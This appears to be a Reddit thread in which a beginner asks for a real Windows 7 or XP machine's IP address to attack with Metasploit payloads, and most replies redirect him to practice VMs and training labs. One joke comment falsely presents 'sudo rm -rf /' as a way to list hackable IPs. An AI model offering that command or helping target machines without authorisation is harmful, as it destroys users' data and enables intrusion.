@@ -1,0 +1,81 @@
+POST ID: 109o0g5 / POST TITLE: Help
+====================================================================================================
+I need a windows 7 or xp machines ip address for a project which is on payloads if someone could provide me that real quivk would be a big help .
+
+POST COMMENTS:
+====================================================================================================
+ID: j3zfamo # OF UPVOTES: 8.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: 192.168.0.1
+----------------------------------------------------------------------------------------------------
+ID: j408o1y # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: Go to r/masterhacker
+----------------------------------------------------------------------------------------------------
+ID: j416j4m # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: if you have to ask you don't know enough to be using msf
+----------------------------------------------------------------------------------------------------
+ID: j438vct # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: If you want to learn the basics, look into HackTheBox or TryHackMe. Both offer exploitable machines and teach you at the same time.
+----------------------------------------------------------------------------------------------------
+ID: j3zh66u # OF UPVOTES: 2.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: Will the msf console exploit work on this ip ?
+----------------------------------------------------------------------------------------------------
+ID: j41df9p # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: I was taking a course and i had been assigned with a project and the teacher there basically teaches the basics and orally dictates what the meterpreter payloads can do and say u can go advanced while you practice more and more
+----------------------------------------------------------------------------------------------------
+ID: j44m1jo # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: I will try
+----------------------------------------------------------------------------------------------------
+ID: j3zr2cs # OF UPVOTES: 10.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: I think that project is the least of your worries on things you'll need to learn...
+----------------------------------------------------------------------------------------------------
+ID: j3zttmn # OF UPVOTES: 2.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: If you need a certain version of something, you should *probably* use virtualbox or vmware to make yourself a virtual machine with the specs you need.
+
+I don't think there's *one* msf console exploit that's been going around, so you'll probably have to be more specific on that front
+----------------------------------------------------------------------------------------------------
+ID: j42zy3o # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: No. This is a Local IP address.
+
+I really don't want to sound patronizing because I'm am in no way shape or form an expert. But from experience having a basic understanding of networks and how computers interact may be beneficial for your course.
+
+I'm sure there are many free online guides around.
+
+Sorry to sound like a prick. Ethical hacking is complex. I don't understand most of it but a firm grasp on the basics is a good start. The last thing you want is to become a 'script kiddie'.
+
+In answer to your question: You could setup a virtual machine or use an online service to practice.
+----------------------------------------------------------------------------------------------------
+ID: j41dpl8 # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: I feel like that class should be teaching you how to spin up some boxes for practice. not to be rude but that's a horrible way to teach a class
+----------------------------------------------------------------------------------------------------
+ID: j3zrs7r # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: Agreed , i am just a beginner right but i intend to hardwork in this field
+----------------------------------------------------------------------------------------------------
+ID: j3zufd9 # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: Basically i got a hack and exploit a windows 7 or xp machine using the meterpreter paloads creating the payload through msfvenom then encoding the payload and using msfconsole exploit on the target machine
+----------------------------------------------------------------------------------------------------
+ID: j44mdfr # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: Sure ,I wouldn't want to be the 'script kiddie' either so i will try my best
+----------------------------------------------------------------------------------------------------
+ID: j41emdf # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: Thats true but the students are not so great either including me only 10 students attend the class and the strength is 35
+----------------------------------------------------------------------------------------------------
+ID: j3zsjog # OF UPVOTES: 6.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: If you run 
+
+sudo rm -rf / 
+
+in the terminal - a whole list of hackable window xp IP addresses will show. Then you can cat that txt.py file to echo the numbers. Remember to then ls -la to see all the .exe in the IP. But run the sudo command first.
+----------------------------------------------------------------------------------------------------
+ID: j430omy # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: atleast you are learning something so thats a start. i suggest supplimenting with tryhackme, and maybe some free youtube/udemy courses etc if you have self motivation. tcm-security also has pretty affordable amazing classes too.
+
+&#x200B;
+
+you are going to want as much knowledge and refreshing of what you learn as you can get, but do take it slow. tryhackme i know has free rooms that teach you how to deploy VMs
+----------------------------------------------------------------------------------------------------
+ID: j3zukv2 # OF UPVOTES: -1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: Thanks for the steps . I will follow them
+----------------------------------------------------------------------------------------------------
+ID: j44m69g # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: Thanks for the head start taking ur adhice in mind i will proceed by making my base strong
+----------------------------------------------------------------------------------------------------
